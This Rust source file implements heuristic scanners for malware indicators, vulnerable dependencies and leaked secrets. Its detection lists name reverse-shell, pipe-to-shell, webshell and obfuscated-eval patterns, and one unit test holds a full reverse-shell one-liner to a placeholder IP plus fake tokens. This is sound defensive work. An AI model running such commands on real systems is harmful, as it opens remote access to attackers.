//! Bounded static artifact scanners: malware indicators, dependency advisories,
//! and secret leak detection. Each operates only over caller-submitted artifacts
//! and inline text — no external feeds are consulted. Findings are readiness
//! evidence, not a substitute for dedicated AV, SCA, or secret-scanning tooling.

use crate::{
    config::{Config, SCHEMA_VERSION},
    models::{
        ArtifactScanReport, ArtifactScanRequest, DependencyAuditRequest, DiagramSource,
        VulnerabilityFinding, VulnerabilitySeverity,
    },
    util::{clean_text, now_ms},
};

/// Iterate inline text plus named artifacts as `(evidence_ref, cleaned_text)`.
fn collect_sources<'a>(
    config: &Config,
    inline_text: Option<&'a str>,
    artifacts: &'a [DiagramSource],
) -> Vec<(String, String)> {
    let mut sources = Vec::new();
    if let Some(text) = inline_text {
        sources.push((
            "inlineText".to_string(),
            clean_text(text, config.max_artifact_bytes),
        ));
    }
    for artifact in artifacts {
        let name = artifact
            .name
            .clone()
            .unwrap_or_else(|| "artifact".to_string());
        sources.push((name, clean_text(&artifact.content, config.max_artifact_bytes)));
    }
    sources
}

fn finalize(
    request_id: Option<String>,
    scan_type: &str,
    id_prefix: &str,
    scanned_bytes: usize,
    mut findings: Vec<VulnerabilityFinding>,
    notes: Vec<String>,
) -> ArtifactScanReport {
    let request_id = request_id
        .filter(|value| !value.trim().is_empty())
        .unwrap_or_else(|| format!("{id_prefix}-{}", now_ms()));
    findings.sort_by(|left, right| {
        right
            .severity
            .cmp(&left.severity)
            .then(left.id.cmp(&right.id))
            .then(left.evidence_ref.cmp(&right.evidence_ref))
    });
    findings.dedup_by(|left, right| {
        left.id == right.id && left.evidence_ref == right.evidence_ref && left.message == right.message
    });
    let high_or_worse = findings
        .iter()
        .filter(|finding| finding.severity >= VulnerabilitySeverity::High)
        .count();
    let summary = format!(
        "{} finding(s) across {} scanned byte(s); {} high-or-worse.",
        findings.len(),
        scanned_bytes,
        high_or_worse
    );
    ArtifactScanReport {
        ok: high_or_worse == 0,
        request_id,
        scan_type: scan_type.to_string(),
        schema_version: SCHEMA_VERSION.to_string(),
        summary,
        scanned_bytes,
        findings,
        generated_at_ms: now_ms(),
        notes,
    }
}

// ---------------------------------------------------------------------------
// Malware scanning
// ---------------------------------------------------------------------------

pub fn scan_malware(config: &Config, request: ArtifactScanRequest) -> ArtifactScanReport {
    let sources = collect_sources(config, request.inline_text.as_deref(), &request.artifacts);
    let mut scanned_bytes = 0usize;
    let mut findings = Vec::new();
    for (evidence_ref, text) in &sources {
        scanned_bytes += text.len();
        scan_malware_text(evidence_ref, text, &request.indicators, &mut findings);
    }
    finalize(
        request.request_id,
        "malware",
        "malware-scan",
        scanned_bytes,
        findings,
        vec![
            "Heuristic indicator scan only; pair with a maintained anti-malware engine and sandbox detonation for binaries.".to_string(),
        ],
    )
}

fn scan_malware_text(
    evidence_ref: &str,
    text: &str,
    indicators: &[String],
    findings: &mut Vec<VulnerabilityFinding>,
) {
    let lower = text.to_ascii_lowercase();
    let checks: &[(&str, VulnerabilitySeverity, &str, &[&str], &str, &str)] = &[
        (
            "eicar-test-signature",
            VulnerabilitySeverity::Critical,
            "signature",
            &["eicar-standard-antivirus-test-file"],
            "EICAR anti-malware test signature is present in submitted evidence.",
            "Confirm whether this is an intentional AV test; if not, quarantine and investigate the source.",
        ),
        (
            "download-and-execute",
            VulnerabilitySeverity::Critical,
            "execution",
            &["| sh", "|sh", "| bash", "|bash", "curl -s", "wget -q"],
            "Pipe-to-shell download-and-execute pattern appears in submitted evidence.",
            "Never pipe remote content straight to a shell; pin and verify artifacts and review the upstream URL.",
        ),
        (
            "reverse-shell",
            VulnerabilitySeverity::Critical,
            "execution",
            &["/dev/tcp/", "nc -e", "ncat -e", "bash -i >&", "sh -i >&", "0>&1"],
            "Reverse-shell construction appears in submitted evidence.",
            "Treat the host as potentially compromised, isolate it, and rotate credentials reachable from it.",
        ),
        (
            "obfuscated-execution",
            VulnerabilitySeverity::High,
            "obfuscation",
            &["eval(base64_decode", "eval(gzinflate", "fromcharcode", "atob(", "iex(new-object", "invoke-expression", "-enc "],
            "Obfuscated or dynamically decoded code execution appears in submitted evidence.",
            "Decode and review the payload in isolation; obfuscated eval is a common malware delivery technique.",
        ),
        (
            "webshell-marker",
            VulnerabilitySeverity::High,
            "webshell",
            &["c99shell", "r57shell", "shell_exec(", "passthru(", "system($_", "@eval($_"],
            "Web-shell marker appears in submitted evidence.",
            "Remove the file, audit the web root for additional implants, and review access logs.",
        ),
        (
            "cryptominer",
            VulnerabilitySeverity::High,
            "cryptomining",
            &["stratum+tcp://", "xmrig", "minerd", "coinhive", "cryptonight"],
            "Cryptominer configuration or binary marker appears in submitted evidence.",
            "Terminate the workload, remove persistence, and check for unauthorized container or cron entries.",
        ),
        (
            "persistence-mechanism",
            VulnerabilitySeverity::Medium,
            "persistence",
            &["crontab -", "/etc/cron.d", "launchagents", "systemctl enable", "reg add hk"],
            "Persistence-mechanism marker appears in submitted evidence.",
            "Confirm the persistence entry is expected; unexpected autoruns are a common malware foothold.",
        ),
    ];
    for (id, severity, category, needles, message, recommendation) in checks {
        if needles.iter().any(|needle| lower.contains(needle)) {
            findings.push(VulnerabilityFinding {
                id: (*id).to_string(),
                severity: *severity,
                category: (*category).to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: (*message).to_string(),
                recommendation: (*recommendation).to_string(),
            });
        }
    }
    for indicator in indicators {
        let needle = indicator.trim();
        if needle.is_empty() {
            continue;
        }
        if lower.contains(&needle.to_ascii_lowercase()) {
            findings.push(VulnerabilityFinding {
                id: "caller-indicator-match".to_string(),
                severity: VulnerabilitySeverity::High,
                category: "ioc".to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: format!("Caller-supplied indicator `{needle}` matched submitted evidence."),
                recommendation: "Investigate per the playbook associated with this indicator of compromise.".to_string(),
            });
        }
    }
}

// ---------------------------------------------------------------------------
// Dependency auditing
// ---------------------------------------------------------------------------

/// Illustrative, deliberately small set of well-known vulnerable package markers.
/// Callers should supply their own `advisories` for authoritative coverage.
const KNOWN_VULNERABLE_MARKERS: &[(&str, &str)] = &[
    ("event-stream@3.3.6", "event-stream 3.3.6 shipped the flatmap-stream credential-stealing backdoor."),
    ("ua-parser-js@0.7.29", "ua-parser-js 0.7.29/0.8.0/1.0.0 were compromised with a crypto miner and password stealer."),
    ("coa@2.0.3", "coa 2.0.3+ malicious releases ran a password-stealing script on install."),
    ("log4j-core@2.14", "log4j-core 2.x before 2.17.1 is affected by Log4Shell (CVE-2021-44228)."),
];

pub fn audit_dependencies(config: &Config, request: DependencyAuditRequest) -> ArtifactScanReport {
    let sources = collect_sources(config, request.inline_text.as_deref(), &request.artifacts);
    let mut scanned_bytes = 0usize;
    let mut findings = Vec::new();
    let mut saw_manifest = false;
    let mut saw_lockfile = false;
    for (evidence_ref, text) in &sources {
        scanned_bytes += text.len();
        let lower_name = evidence_ref.to_ascii_lowercase();
        if is_lockfile(&lower_name) {
            saw_lockfile = true;
        }
        if is_manifest(&lower_name) {
            saw_manifest = true;
        }
        audit_dependency_text(evidence_ref, text, &request.advisories, &mut findings);
    }
    if saw_manifest && !saw_lockfile {
        findings.push(VulnerabilityFinding {
            id: "missing-lockfile".to_string(),
            severity: VulnerabilitySeverity::Low,
            category: "supply-chain".to_string(),
            evidence_ref: "request".to_string(),
            message: "A dependency manifest was submitted without an accompanying lockfile.".to_string(),
            recommendation: "Commit and submit the lockfile so dependency resolution is reproducible and auditable.".to_string(),
        });
    }
    finalize(
        request.request_id,
        "dependency",
        "dependency-audit",
        scanned_bytes,
        findings,
        vec![
            "Static manifest audit only; run a maintained SCA tool with a live advisory database for authoritative CVE coverage.".to_string(),
        ],
    )
}

fn is_manifest(name: &str) -> bool {
    [
        "package.json",
        "cargo.toml",
        "requirements.txt",
        "go.mod",
        "gemfile",
        "pom.xml",
        "build.gradle",
        "composer.json",
        "pyproject.toml",
    ]
    .iter()
    .any(|marker| name.contains(marker))
}

fn is_lockfile(name: &str) -> bool {
    [
        "package-lock.json",
        "pnpm-lock.yaml",
        "yarn.lock",
        "cargo.lock",
        "poetry.lock",
        "go.sum",
        "gemfile.lock",
        "composer.lock",
    ]
    .iter()
    .any(|marker| name.contains(marker))
}

fn audit_dependency_text(
    evidence_ref: &str,
    text: &str,
    advisories: &[crate::models::DependencyAdvisory],
    findings: &mut Vec<VulnerabilityFinding>,
) {
    let lower = text.to_ascii_lowercase();
    for (marker, detail) in KNOWN_VULNERABLE_MARKERS {
        let (name, _version) = marker.split_once('@').unwrap_or((marker, ""));
        if lower.contains(name) {
            findings.push(VulnerabilityFinding {
                id: format!("known-vulnerable-{}", name.replace(['/', ' '], "-")),
                severity: VulnerabilitySeverity::High,
                category: "known-vulnerable".to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: format!("Dependency `{name}` matches a known-vulnerable marker. {detail}"),
                recommendation: "Upgrade to a fixed release and verify the lockfile no longer resolves the affected version.".to_string(),
            });
        }
    }
    for advisory in advisories {
        let package = advisory.package.trim().to_ascii_lowercase();
        if package.is_empty() || !lower.contains(&package) {
            continue;
        }
        let version_matches = advisory
            .affected_version
            .as_deref()
            .map(|version| version.trim())
            .filter(|version| !version.is_empty())
            .map(|version| lower.contains(&version.to_ascii_lowercase()))
            .unwrap_or(true);
        if version_matches {
            findings.push(VulnerabilityFinding {
                id: format!("advisory-{}", package.replace(['/', ' '], "-")),
                severity: advisory.severity.unwrap_or(VulnerabilitySeverity::High),
                category: "advisory".to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: format!(
                    "Dependency `{}` matches a caller-supplied advisory. {}",
                    advisory.package,
                    advisory.advisory.as_deref().unwrap_or("")
                ),
                recommendation: "Remediate per the supplied advisory and pin to a non-affected version.".to_string(),
            });
        }
    }
    for raw in text.lines() {
        let line = raw.trim();
        let line_lower = line.to_ascii_lowercase();
        if line_lower.contains("git+") || line_lower.contains("github:") {
            push_unique(findings, VulnerabilityFinding {
                id: "vcs-sourced-dependency".to_string(),
                severity: VulnerabilitySeverity::Medium,
                category: "supply-chain".to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: "A dependency is sourced directly from a VCS URL rather than a registry release.".to_string(),
                recommendation: "Prefer immutable registry releases; VCS refs can move and bypass integrity checks.".to_string(),
            });
        }
        if line_lower.contains("http://") && (line_lower.contains("dependenc") || line_lower.contains("registry") || line_lower.contains("repositor")) {
            push_unique(findings, VulnerabilityFinding {
                id: "insecure-registry".to_string(),
                severity: VulnerabilitySeverity::Medium,
                category: "supply-chain".to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: "A package source or registry is referenced over plaintext HTTP.".to_string(),
                recommendation: "Use HTTPS registries so package integrity and provenance can be verified in transit.".to_string(),
            });
        }
        if line_lower.contains("\"*\"") || line_lower.contains(": \"latest\"") || line_lower.contains("=\"latest\"") {
            push_unique(findings, VulnerabilityFinding {
                id: "unpinned-dependency".to_string(),
                severity: VulnerabilitySeverity::Low,
                category: "supply-chain".to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: "A dependency uses a wildcard or `latest` version specifier.".to_string(),
                recommendation: "Pin dependencies to explicit versions and rely on a lockfile for reproducible builds.".to_string(),
            });
        }
    }
}

fn push_unique(findings: &mut Vec<VulnerabilityFinding>, finding: VulnerabilityFinding) {
    if !findings
        .iter()
        .any(|existing| existing.id == finding.id && existing.evidence_ref == finding.evidence_ref)
    {
        findings.push(finding);
    }
}

// ---------------------------------------------------------------------------
// Secret leak detection
// ---------------------------------------------------------------------------

pub fn scan_secrets(config: &Config, request: ArtifactScanRequest) -> ArtifactScanReport {
    let sources = collect_sources(config, request.inline_text.as_deref(), &request.artifacts);
    let mut scanned_bytes = 0usize;
    let mut findings = Vec::new();
    for (evidence_ref, text) in &sources {
        scanned_bytes += text.len();
        scan_secret_text(evidence_ref, text, &mut findings);
    }
    finalize(
        request.request_id,
        "secret",
        "secret-scan",
        scanned_bytes,
        findings,
        vec![
            "Heuristic prefix/keyword scan with redacted output; pair with a maintained secret scanner and pre-commit hooks.".to_string(),
        ],
    )
}

/// Detectors keyed on stable token prefixes. Each emits a redacted preview so the
/// report can be retained without re-exposing the credential.
const SECRET_PREFIXES: &[(&str, VulnerabilitySeverity, &str)] = &[
    ("akia", VulnerabilitySeverity::Critical, "AWS access key id"),
    ("ghp_", VulnerabilitySeverity::Critical, "GitHub personal access token"),
    ("gho_", VulnerabilitySeverity::Critical, "GitHub OAuth token"),
    ("ghs_", VulnerabilitySeverity::Critical, "GitHub server token"),
    ("github_pat_", VulnerabilitySeverity::Critical, "GitHub fine-grained token"),
    ("xoxb-", VulnerabilitySeverity::High, "Slack bot token"),
    ("xoxp-", VulnerabilitySeverity::High, "Slack user token"),
    ("xapp-", VulnerabilitySeverity::High, "Slack app-level token"),
    ("sk_live_", VulnerabilitySeverity::Critical, "Stripe live secret key"),
    ("rk_live_", VulnerabilitySeverity::Critical, "Stripe live restricted key"),
    ("aiza", VulnerabilitySeverity::High, "Google API key"),
    ("ya29.", VulnerabilitySeverity::High, "Google OAuth access token"),
    ("sk-", VulnerabilitySeverity::High, "Provider API secret key"),
];

fn scan_secret_text(evidence_ref: &str, text: &str, findings: &mut Vec<VulnerabilityFinding>) {
    let lower = text.to_ascii_lowercase();
    // Token-prefix detectors operate per whitespace-delimited token so we can
    // redact the actual secret and require a plausible length.
    for token in text.split(|ch: char| ch.is_whitespace() || matches!(ch, '"' | '\'' | ',' | ';' | '=' | ':')) {
        let trimmed = token.trim();
        if trimmed.len() < 12 {
            continue;
        }
        let token_lower = trimmed.to_ascii_lowercase();
        for (prefix, severity, label) in SECRET_PREFIXES {
            if token_lower.starts_with(prefix) {
                findings.push(VulnerabilityFinding {
                    id: format!("secret-{}", prefix.trim_end_matches(['_', '-', '.', ' '])),
                    severity: *severity,
                    category: "secret".to_string(),
                    evidence_ref: evidence_ref.to_string(),
                    message: format!("Possible {label} detected: {}", redact(trimmed)),
                    recommendation: "Revoke and rotate the credential, purge it from source and history, and move it to a secret manager.".to_string(),
                });
            }
        }
    }
    let keyword_checks: &[(&str, &[&str], &str)] = &[
        (
            "private-key-block",
            &["-----begin rsa private key", "-----begin openssh private key", "-----begin ec private key", "-----begin private key"],
            "PEM private-key block",
        ),
        (
            "jwt-token",
            &["eyjhbgci", "eyjraw"],
            "JSON Web Token",
        ),
        (
            "inline-credential",
            &["password=", "passwd=", "secret=", "client_secret", "api_key", "apikey", "access_token="],
            "inline credential assignment",
        ),
    ];
    for (id, needles, label) in keyword_checks {
        if needles.iter().any(|needle| lower.contains(needle)) {
            findings.push(VulnerabilityFinding {
                id: (*id).to_string(),
                severity: VulnerabilitySeverity::High,
                category: "secret".to_string(),
                evidence_ref: evidence_ref.to_string(),
                message: format!("Possible {label} detected in submitted evidence."),
                recommendation: "Remove the secret from the artifact, rotate it, and reference it from a secret manager instead.".to_string(),
            });
        }
    }
    // Embedded URL credentials: scheme://user:pass@host
    if let Some(finding) = scan_url_credentials(&lower, evidence_ref) {
        findings.push(finding);
    }
}

fn scan_url_credentials(lower: &str, evidence_ref: &str) -> Option<VulnerabilityFinding> {
    let scheme = lower.find("://")?;
    let after = &lower[scheme + 3..];
    let at = after.find('@')?;
    let userinfo = &after[..at];
    if userinfo.contains(':') && !userinfo.contains('/') && !userinfo.is_empty() {
        return Some(VulnerabilityFinding {
            id: "url-embedded-credential".to_string(),
            severity: VulnerabilitySeverity::High,
            category: "secret".to_string(),
            evidence_ref: evidence_ref.to_string(),
            message: "A connection string embeds credentials in a URL (scheme://user:pass@host).".to_string(),
            recommendation: "Move credentials out of connection URLs into a secret manager and reference them at runtime.".to_string(),
        });
    }
    None
}

fn redact(token: &str) -> String {
    let visible: String = token.chars().take(4).collect();
    format!("{visible}\u{2026} ({} chars, redacted)", token.len())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn test_config() -> Config {
        Config {
            host: "127.0.0.1".to_string(),
            port: 8118,
            work_root: PathBuf::from("/tmp/dd-compliance-rs-scanners-test"),
            server_auth_secret: Some("secret".to_string()),
            allow_unauthenticated: false,
            allow_external_fetch: false,
            allow_repo_clone: false,
            allow_private_targets: false,
            allowed_repo_prefixes: vec![],
            allowed_file_extensions: vec!["rs".to_string()],
            git_bin: "git".to_string(),
            job_timeout: std::time::Duration::from_secs(5),
            max_jobs: 20,
            max_concurrent_jobs: 2,
            max_http_body_bytes: 1024 * 1024,
            max_artifact_bytes: 1024 * 1024,
            max_files: 100,
            max_file_bytes: 1024 * 1024,
            max_findings_per_job: 200,
        }
    }

    fn source(name: &str, content: &str) -> DiagramSource {
        DiagramSource {
            name: Some(name.to_string()),
            content: content.to_string(),
        }
    }

    #[test]
    fn malware_scan_flags_reverse_shell_and_indicator() {
        let report = scan_malware(
            &test_config(),
            ArtifactScanRequest {
                request_id: None,
                title: None,
                artifacts: vec![source("run.sh", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1")],
                inline_text: None,
                indicators: vec!["203.0.113.10".to_string()],
            },
        );
        assert!(!report.ok);
        assert_eq!(report.scan_type, "malware");
        assert!(report.findings.iter().any(|f| f.id == "reverse-shell"));
        assert!(report.findings.iter().any(|f| f.id == "caller-indicator-match"));
    }

    #[test]
    fn dependency_audit_flags_advisory_and_unpinned() {
        let report = audit_dependencies(
            &test_config(),
            DependencyAuditRequest {
                request_id: None,
                title: None,
                artifacts: vec![source(
                    "package.json",
                    "{\"dependencies\":{\"express\":\"*\",\"left-pad\":\"latest\"}}",
                )],
                inline_text: None,
                advisories: vec![crate::models::DependencyAdvisory {
                    package: "express".to_string(),
                    affected_version: None,
                    severity: Some(VulnerabilitySeverity::High),
                    advisory: Some("test".to_string()),
                }],
            },
        );
        assert!(!report.ok);
        assert!(report.findings.iter().any(|f| f.id == "advisory-express"));
        assert!(report.findings.iter().any(|f| f.id == "unpinned-dependency"));
        assert!(report.findings.iter().any(|f| f.id == "missing-lockfile"));
    }

    #[test]
    fn secret_scan_redacts_and_flags_tokens() {
        let report = scan_secrets(
            &test_config(),
            ArtifactScanRequest {
                request_id: None,
                title: None,
                artifacts: vec![source(".env", "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789")],
                inline_text: Some("postgres://app:hunter2@db.internal:5432/app".to_string()),
                indicators: vec![],
            },
        );
        assert!(!report.ok);
        assert!(report.findings.iter().any(|f| f.id == "secret-ghp"));
        assert!(report.findings.iter().any(|f| f.id == "url-embedded-credential"));
        // The raw secret must not survive into the report.
        let serialized = serde_json::to_string(&report).unwrap();
        assert!(!serialized.contains("abcdefghijklmnopqrstuvwxyz0123456789"));
    }
}
